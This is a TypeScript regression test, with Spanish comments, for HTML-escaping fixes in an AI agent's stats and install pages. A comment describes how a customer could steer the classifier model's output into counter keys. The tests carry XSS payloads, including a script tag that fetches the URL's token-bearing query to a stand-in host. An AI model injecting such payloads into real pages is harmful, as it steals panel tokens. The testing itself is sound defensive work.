import { test, mock } from 'node:test';
import assert from 'node:assert/strict';
import type { Request, Response } from 'express';

// /stats interpolaba sin escapar los contadores técnicos, y entre ellos hay claves que arma el scoring
// con la salida del clasificador (`intencion:<lo que respondió el modelo>`): un cliente que dirige al
// modelo con su mensaje podía dejar HTML activo en una página que se abre con el token del panel en
// la URL. /install, por su parte, reflejaba el texto de errores externos en su página HTML.
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = '';

mock.module('../src/bitrix/refresh.ts', {
  namedExports: {
    exchangeCode: async () => {
      throw new Error('OAuth code: invalid_grant <img src=x onerror=alert(1)>');
    },
    refreshAuth: async () => {
      throw new Error('no se usa en esta prueba');
    },
  },
});

const { paginaStats } = await import('../src/routes/stats');
const { escaparHtml } = await import('../src/util/html');
const { installHandler } = await import('../src/routes/install');

// La plantilla tal como estaba en index.ts, para comprobar que con datos normales no cambia nada.
function paginaStatsAnterior(m: any, audits: any[], kvKind: string, conDb: boolean) {
  const rows = audits
    .map((a: any) => `<tr><td>${a.ts}</td><td>${a.type}</td><td>${a.dialog_id ?? ''}</td><td>${a.crm_entity ?? ''}</td></tr>`)
    .join('');
  return (
    `<!doctype html><meta charset="utf-8"><body style="font-family:system-ui,sans-serif;padding:1.5rem;line-height:1.4">` +
    `<h2>PoC Agente — Observabilidad</h2>` +
    `<p>KV: <b>${kvKind}</b> · DB: <b>${conDb ? 'postgres' : 'off'}</b> · activo desde ${m.startedAt}</p>` +
    `<h3>Métricas</h3><pre>${JSON.stringify(m, null, 2)}</pre>` +
    `<h3>Auditoría reciente${conDb ? '' : ' (sin Postgres: solo en logs)'}</h3>` +
    `<table border="1" cellpadding="6" style="border-collapse:collapse"><tr><th>ts</th><th>type</th><th>dialog</th><th>crm</th></tr>${rows}</table>` +
    `</body>`
  );
}

test('escaparHtml cubre contenido y atributos', () => {
  assert.equal(escaparHtml(`<a href="x" onclick='y'>&</a>`), '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&lt;/a&gt;');
  assert.equal(escaparHtml(null), '');
  assert.equal(escaparHtml(42), '42');
});

// Lo que el navegador muestra: el escape cambia los bytes (p.ej. las comillas del JSON pasan a
// &quot;), no el texto visible.
const textoVisible = (s: string) =>
  s.replace(/&(amp|lt|gt|quot|#39);/g, (_, e: string) => ({ amp: '&', lt: '<', gt: '>', quot: '"', '#39': "'" })[e]!);

test('/stats: con datos normales se ve exactamente lo mismo que antes', () => {
  const m = { startedAt: '2026-10-18T12:00:00.000Z', counters: { turnos: 3, 'intencion:alta': 2 }, llm: { samples: 1, avgMs: 900, p95Ms: 900 } };
  const audits = [{ ts: new Date('2026-10-18T12:00:00Z'), type: 'turn', dialog_id: 'chat123', crm_entity: 'deal#45' }, { ts: '2026-10-18', type: 'tool_call', dialog_id: null, crm_entity: null }];
  assert.equal(textoVisible(paginaStats(m, audits, 'redis', true)), paginaStatsAnterior(m, audits, 'redis', true));
  assert.equal(textoVisible(paginaStats(m, audits, 'memory', false)), paginaStatsAnterior(m, audits, 'memory', false));
});

test('/stats: una clave de contador o un diálogo con HTML no se ejecuta', () => {
  const malo = '</pre><script>fetch("//x/?"+location.search)</script>';
  const m = { startedAt: 'x', counters: { [`intencion:${malo}`]: 1 } };
  const html = paginaStats(m, [{ ts: 'x', type: 'turn', dialog_id: '<img src=x onerror=alert(1)>', crm_entity: '' }], 'redis', true);
  assert.ok(!html.includes('<script>'), 'sin <script> activo');
  assert.ok(!html.includes('<img'), 'sin <img> activo');
  assert.ok(html.includes('&lt;script&gt;'), 'el texto se muestra escapado');
});

test('/install: el error externo se muestra escapado en la página', async () => {
  let cuerpo = '';
  let status = 0;
  const res = { status: (s: number) => ((status = s), res), send: (b: string) => ((cuerpo = b), res) } as unknown as Response;
  await installHandler({ query: { code: 'x' }, body: {}, path: '/app' } as unknown as Request, res);
  assert.equal(status, 400);
  assert.ok(!cuerpo.includes('<img src=x'), 'el HTML del error no queda activo');
  assert.ok(cuerpo.includes('&lt;img src=x onerror=alert(1)&gt;'));
});
